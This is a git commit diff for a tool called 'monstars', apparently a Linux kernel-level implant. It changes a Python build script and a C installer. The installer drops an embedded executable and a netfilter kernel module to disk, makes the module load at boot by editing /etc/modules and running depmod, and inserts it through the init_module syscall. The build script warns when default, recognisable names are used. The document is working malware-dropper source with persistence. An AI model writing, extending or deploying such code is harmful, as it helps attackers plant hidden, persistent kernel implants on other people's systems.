a9fe74cd94505aa39a4626694a28e27042749237
J-Spade <j_spade@verizon.net>
2023-02-07 20:50:04 -0500

    persist kernel module, stamp installer with paths

--- build_monstars.py
+++ build_monstars.py
@@ -17,12 +17,17 @@ EXE_NAME = "monstars"
 INSTALLER_NAME = "go-monstars"
 
 DEFAULT_KO_NAME = "monstars_nf"
+DEFAULT_EXE_PATH = "/bin/monstars"
 
 KO_PRECOMPILED_H = "ko_precompiled.h"
 KO_CONST_NAME = "c_KernelMod"
+KO_STAMP_MAGIC = b"BASKETBALLJONES"
 
 USER_PRECOMPILED_H = "user_precompiled.h"
 USER_CONST_NAME = "c_UserExe"
+
+INSTALLER_STAMP_MAGIC_USER = b"BASKETBALLJONES"
+INSTALLER_STAMP_MAGIC_KO = b"MORONMOUNTAIN"
 
 KERNEL_VERSIONS = [
     # "2.6.32-754.el6.x86_64",
@@ -45,12 +50,18 @@ KERNEL_C_FLAGS = {
 }
 
 
-def _generate_header(src_path, dst_path, var_name):
+def _stamp_binary(binary, stamp_pattern, stamp_data):
+    """Stamp over a pattern in the binary data and return the result"""
+    print(f"\n\n** Stamping over {stamp_pattern}")
+    idx = binary.index(stamp_pattern)
+    return binary.replace(binary[idx : idx + len(stamp_data) + 1], stamp_data + b"\x00")
+
+
+def _generate_header(binary, dst_path, var_name):
     """Generate a header from a precompiled binary"""
     print(f"\n\n** Generating {dst_path}...")
-    with open(src_path, "rb") as f:
-        bin_str = bytes.hex(f.read())
-        arr_elems = [f"0x{bin_str[i:i+2]}" for i in range(0, len(bin_str), 2)]
+    bin_str = bytes.hex(binary)
+    arr_elems = [f"0x{bin_str[i:i+2]}" for i in range(0, len(bin_str), 2)]
     with open(dst_path, "w") as hdr:
         hdr.write(
             "/*\n"
@@ -64,7 +75,7 @@ def _generate_header(src_path, dst_path, var_name):
         )
 
 
-def run_build(kernel_ver, ko_name, debug):
+def run_build(kernel_ver, ko_name, exe_path, debug):
     """Build it!"""
     target = "debug" if debug else ""
     os.environ.update(
@@ -93,21 +104,27 @@ def run_build(kernel_ver, ko_name, debug):
     subprocess.run(
         "make clean", cwd=KERNEL_DIR, shell=True
     )
+    # Stamp user exe path into kernel module binary
+    with open(BUILD_DIR / kernel_ver / f"{ko_name}.ko", "rb") as f:
+        kernel_bin = f.read()
+    kernel_bin = _stamp_binary(kernel_bin, KO_STAMP_MAGIC, exe_path.encode("ascii"))
 
     # Build userland executable
     print(f"\n\n** Building user exe for {kernel_ver}...\n")
     subprocess.run(
         f"make {target}", cwd=USER_DIR, shell=True
     )
-
+    with open(BUILD_DIR / kernel_ver / EXE_NAME, "rb") as f:
+        user_bin = f.read()
+    
     # Generate precompiled headers
     _generate_header(
-        BUILD_DIR / kernel_ver / f"{ko_name}.ko",
+        kernel_bin,
         BUILD_DIR / kernel_ver / KO_PRECOMPILED_H,
         KO_CONST_NAME,
     )
     _generate_header(
-        BUILD_DIR / kernel_ver / EXE_NAME,
+        user_bin,
         BUILD_DIR / kernel_ver / USER_PRECOMPILED_H,
         USER_CONST_NAME,
     )
@@ -117,14 +134,18 @@ def run_build(kernel_ver, ko_name, debug):
     subprocess.run(
         f"make {target}", cwd=INSTALLER_DIR, shell=True
     )
+    # Stamp installer with user exe path and ko module path
+    ko_path = f"/lib/modules/{kernel_ver}/kernel/drivers/net/{ko_name}.ko".encode("ascii")
+    with open(BUILD_DIR / kernel_ver / INSTALLER_NAME, "rb") as f:
+        installer_bin = f.read()
+    installer_bin = _stamp_binary(installer_bin, INSTALLER_STAMP_MAGIC_KO, ko_path)
+    installer_bin = _stamp_binary(installer_bin, INSTALLER_STAMP_MAGIC_USER, exe_path.encode("ascii"))
 
     # Copy installer to export directory
-    installer_src = BUILD_DIR / kernel_ver / INSTALLER_NAME
     installer_dest = EXPORT_DIR / f"{INSTALLER_NAME}_{kernel_ver}"
     os.makedirs(EXPORT_DIR, exist_ok=True)
-    if installer_dest.exists():
-        os.unlink(installer_dest)
-    shutil.copy(installer_src, installer_dest)
+    with open(installer_dest, "wb") as f:
+        f.write(installer_bin)
 
 
 if __name__ == "__main__":
@@ -145,7 +166,14 @@ if __name__ == "__main__":
         default=DEFAULT_KO_NAME,
         help="name to use for the kernel netfilter module",
     )
+    parser.add_argument(
+        "-e", "--exe-path",
+        default=DEFAULT_EXE_PATH,
+        help="path to the userland executable",
+    )
     args = parser.parse_args()
     if args.ko_name == DEFAULT_KO_NAME and not args.debug:
         print("*** WARNING: USED DEFAULT KO NAME FOR NON-DEBUG BUILD ***")
-    run_build(args.kernel_ver, args.ko_name, args.debug)
+    if args.exe_path == DEFAULT_EXE_PATH and not args.debug:
+        print("*** WARNING: USED DEFAULT EXE PATH FOR NON-DEBUG BUILD ***")
+    run_build(args.kernel_ver, args.ko_name, args.exe_path, args.debug)
--- installer/installer.c
+++ installer/installer.c
@@ -1,76 +1,199 @@
 #include <errno.h>
+#include <libgen.h>
 #include <linux/module.h>
 #include <sys/stat.h>
 #include <sys/syscall.h>
 #include <stdbool.h>
 #include <stdio.h>
+#include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
 
 #include "macros.h"
 
-// *** magic value in kernel module to stamp over ***
-const char *c_ko_stamp_magic = "BASKETBALLJONES";
+// *** magic values to stamp over ***
+static const char c_user_exe_path[255] = "BASKETBALLJONES";
+static const char c_kernel_mod_path[255] = "MORONMOUNTAIN";
 
-int main(int argc, char* argv[])
+//
+// drop the user exe to disk
+//
+int drop_user_exe()
 {
-    FILE *user_exe = NULL;
-    char *user_path = NULL;
-    bool ko_stamped = false;
-
-    // param validation
-    if (1 == argc)
+    int retval = -1;
+    FILE *user_exe = fopen(c_user_exe_path, "w");
+    if (NULL != user_exe)
     {
-        DEBUG_LOG("No user exe path specified\n");
-        return -1;
-    }
-    user_path = argv[1];
-
-    // find and stamp the kernel magic with the user exe path
-    for (char *ko_ptr = (char *)c_KernelMod; ko_ptr < c_KernelMod + sizeof(c_KernelMod); ko_ptr++)
-    {
-        // search for the magic value
-        if (0 == memcmp(c_ko_stamp_magic, ko_ptr, sizeof(c_ko_stamp_magic)))
+        if (sizeof(c_UserExe) == fwrite((void *)c_UserExe, sizeof(char), sizeof(c_UserExe), user_exe))
         {
-            strncpy(ko_ptr, user_path, strlen(user_path) + 1);
-            ko_stamped = true;
-            break;
+            if (0 == chmod(c_user_exe_path, S_IRWXU))
+            {
+                DEBUG_LOG("Dropped user exe: %s\n", c_user_exe_path);
+                retval = 0;
+            }
+            else
+            {
+                DEBUG_LOG("Could not chmod u+x on user exe (errno: %d)\n", errno);
+            }
+        }
+        else
+        {
+            DEBUG_LOG("Could not write user exe to %s (errno: %d)\n", c_user_exe_path, errno);
+        }
+        fclose(user_exe);
+    }
+    else
+    {
+        DEBUG_LOG("Could not open %s (errno: %d)\n", c_user_exe_path, errno);
+    }
+
+    return retval;
+}
+
+//
+// drop the kernel module to disk
+//
+int drop_kernel_mod()
+{
+    int retval = -1;
+    FILE *ko = fopen(c_kernel_mod_path, "w");
+    if (NULL != ko)
+    {
+        if (sizeof(c_KernelMod) == fwrite((void *)c_KernelMod, sizeof(char), sizeof(c_KernelMod), ko))
+        {
+            DEBUG_LOG("Dropped kernel module: %s\n", c_kernel_mod_path);
+            retval = 0;
+        }
+        else
+        {
+            DEBUG_LOG("Could not write ko to %s (errno: %d)\n", c_kernel_mod_path, errno);
+        }
+        fclose(ko);
+    }
+    else
+    {
+        DEBUG_LOG("Could not open %s (errno: %d)\n", c_kernel_mod_path, errno);
+    }
+
+    return retval;
+}
+
+//
+// set up the kernel module to be inserted on boot
+//
+int persist_kernel_mod()
+{
+    int retval = -1;
+    char *ko_basename = NULL;
+    char ko_name[50] = {0};
+    FILE *os_release = NULL;
+    char os_buf[128] = {0};
+    size_t read = 0;
+    int depmod_ret = 0;
+
+    // parse the object name from the file path
+    ko_basename = basename((char*)c_kernel_mod_path);
+    if (NULL == ko_basename)
+    {
+        DEBUG_LOG("Could not split ko filename (errno: %d)\n", errno);
+        goto exit;
+    }
+    if (1 != sscanf(ko_basename, "%[^.].ko", ko_name))
+    {
+        DEBUG_LOG("Could not parse ko name (errno: %d)\n", errno);
+        goto exit;
+    }
+
+    // determine which distro flavor we're on
+    os_release = fopen("/etc/os-release", "r");
+    if (NULL == os_release)
+    {
+        DEBUG_LOG("Could not open /etc/os-release (errno: %d)\n", errno);
+        goto exit;
+    }
+    read = fread(os_buf, sizeof(char), sizeof(os_buf), os_release);
+    fclose(os_release);
+    if (sizeof(os_buf) != read)
+    {
+        DEBUG_LOG("Could not read /etc/os-release (errno: %d)\n", errno);
+        goto exit;
+    }
+
+    // Ubuntu: add entry to /etc/modules
+    if (NULL != strstr(os_buf, "Ubuntu"))
+    {
+        FILE *modules = fopen("/etc/modules", "a");
+        if (NULL != modules)
+        {
+            char ko_mod_entry[52] = {0};
+            size_t written = 0;
+
+            snprintf(ko_mod_entry, sizeof(ko_mod_entry), "\n%s", ko_name);
+            written = fwrite((void *)ko_mod_entry, sizeof(char), strlen(ko_mod_entry), modules);
+            fclose(modules);
+
+            if (strlen(ko_mod_entry) == written)
+            {
+                depmod_ret = system("depmod");  // update the kernel module database
+                if (0 == depmod_ret)
+                {
+                    DEBUG_LOG("Added %s to /etc/modules\n", ko_name);
+                    retval = 0;
+                }
+                else
+                {
+                    DEBUG_LOG("depmod returned: %d\n", depmod_ret);
+                }
+            }
+            else
+            {
+                DEBUG_LOG("Could not create /etc/modules entry (errno: %d)\n", errno);
+            }
+        }
+        else
+        {
+            DEBUG_LOG("Could not open /etc/modules (errno: %d)\n", errno);
         }
     }
-    if (!ko_stamped)
+    // TODO: else if CentOS, possibly OpenSUSE
+    else
     {
-        DEBUG_LOG("Could not find magic value to stamp in kernel module\n");
-        return -2;
+        DEBUG_LOG("Could not determine linux distro flavor!\n");
     }
 
-    // drop the user exe to disk
-    user_exe = fopen(user_path, "w");
-    if (NULL == user_exe)
+exit:
+    return retval;
+}
+
+int main()
+{
+    int retval = -1;
+
+    if (0 == drop_user_exe())
     {
-        DEBUG_LOG("Could not open %s (errno: %d)\n", user_path, errno);
-        return -3;
-    }
-    if (sizeof(c_UserExe) != fwrite((void *)c_UserExe, sizeof(char), sizeof(c_UserExe), user_exe))
-    {
-        DEBUG_LOG("Could not write user exe to %s (errno: %d)\n", user_path, errno);
-        return -4;
-    }
-    fclose(user_exe);
-    user_exe = NULL;
-    if (0 != chmod(user_path, S_IRWXU))
-    {
-        DEBUG_LOG("Could not chmod u+x on user exe (errno: %d)\n", errno);
-        return -5;
+        if (0 == drop_kernel_mod())
+        {
+            if (0 == persist_kernel_mod())
+            {
+                if (0 == syscall(SYS_init_module, (void *)c_KernelMod, sizeof(c_KernelMod), ""))
+                {
+                    DEBUG_LOG("MONSTARS_NF installed!\n");
+                    retval = 0;
+                }
+                else
+                {
+                    DEBUG_LOG("Failed to insert MONSTARS_NF module (errno: %d)\n", errno);
+                }
+            }
+        }
     }
 
-    // insert the kernel module
-    if (0 != syscall(SYS_init_module, (void *)c_KernelMod, sizeof(c_KernelMod), ""))
+    // cleanup in error cases
+    if (0 != retval)
     {
-        DEBUG_LOG("Failed to install MONSTARS_NF module (errno: %d)\n", errno);
-        return -6;
+        unlink(c_kernel_mod_path);
+        unlink(c_user_exe_path);
     }
-    
-    DEBUG_LOG("MONSTARS_NF installed!\n");
 
-    return 0;
+    return retval;
 }
